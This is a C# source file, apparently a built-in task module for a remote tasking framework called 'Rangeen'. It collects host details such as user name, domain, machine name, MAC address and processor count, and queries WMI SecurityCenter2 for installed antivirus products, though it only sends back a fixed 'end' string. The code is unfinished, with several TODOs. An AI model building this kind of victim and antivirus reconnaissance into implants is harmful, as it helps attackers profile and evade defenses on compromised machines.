using System;
using System.Collections.Specialized;
using System.Management;
using System.Net;
using System.Net.NetworkInformation;
using Rangeen.Transport;
using UtilsLib;

namespace Rangeen.BuiltInTasks
{
    /// <summary>
    /// BuiltInTaskTemplate description
    /// </summary>
    public class SI
    {
        private Action<byte[], object> _resultAcceptor;

        public void Execute(string[] args, Action<byte[], object> resultAcceptor, object taskInfo)
        {
            _resultAcceptor = resultAcceptor;

            Console.WriteLine("[BuiltInTaskTemplate] runned. Args Len: {0}", args.Length);
            for (int i = 0; i < args.Length; i++)
            {
                Console.WriteLine("\t[BuiltInTaskTemplate] Arg #{0}: {1}", i, args[i]);
            }
            try
            {
                DateTime dtCurrentTime = DateTime.UtcNow;
                string stime = string.Format("Local time (system formatted): {0}", dtCurrentTime);
                string sUserDomainName = string.Format("Domain of user is: {0}", Environment.UserDomainName);
                string sUserName = string.Format("User name is: {0}", Environment.UserName);
                string sComputerName = string.Format("Computer name is: {0}", Environment.MachineName);
                string sLocalIp = string.Format("Local IP Address: {0}", Dns.GetHostName()); //TODO:Dont get it:(
                string sMac;
                foreach (NetworkInterface nic in NetworkInterface.GetAllNetworkInterfaces())
                {
                    // Only consider Ethernet network interfaces
                    if (nic.NetworkInterfaceType == NetworkInterfaceType.Ethernet &&
                        nic.OperationalStatus == OperationalStatus.Up)
                    {
                        sMac = nic.GetPhysicalAddress().ToString();   //TODO:Need to make sMac as array
                    }
                }
                string sProcCount = string.Format("Processor count: {0}", Environment.ProcessorCount);

                ManagementObjectSearcher objSearcher = new ManagementObjectSearcher("root\\SecurityCenter2", "SELECT * FROM " + "AntiVirusProduct");
                NameValueCollection outputCollection = new NameValueCollection();

                foreach (ManagementObject queryObj in objSearcher.Get())
                {
                    foreach (PropertyData propertyData in queryObj.Properties)
                    {
                        // Add found properties to the collection
                        outputCollection.Add(propertyData.Name.ToString(), propertyData.Value.ToString()); //TODO: TRANSLATE UID OR GUID TO ANTIVIRUS NAME
                    }
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine(ex.StackTrace);
                throw;
            }

            var output = "BuiltInTaskTemplate end";
            _resultAcceptor.Invoke(output.GetBytes(), taskInfo);
        }

    }

}